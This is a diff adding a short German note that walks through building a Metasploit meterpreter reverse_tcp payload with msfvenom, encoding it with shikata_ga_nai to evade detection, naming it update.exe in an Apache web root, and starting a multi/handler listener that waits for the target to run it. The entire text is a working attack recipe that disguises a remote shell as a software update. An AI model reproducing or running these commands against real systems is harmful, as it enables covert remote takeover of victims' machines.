@@ -1,0 +1,22 @@
+metasploit reverse_tcp
+
+/var/www/html/update.exe output für zugriff per apache
+
+exploit wartet auf verbindung durch Zielhost, erfolgt nach ausführung der update.exe
+
+
+1. msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.160.128 LPORT=8080 -f exe --platform windows --arch x86 -e x86/shikata_ga_nai -i 10 > /var/www/html/update.exe
+
+2. use exploit/multi/handler
+
+3. set payload windows/meterpreter/reverse_tcp
+
+4. set LHOST 192.168.160.128
+
+5. set LPORT 8080
+
+6. show options
+
+7. exploit
+
+8. update.exe auf Zielhost ausführen
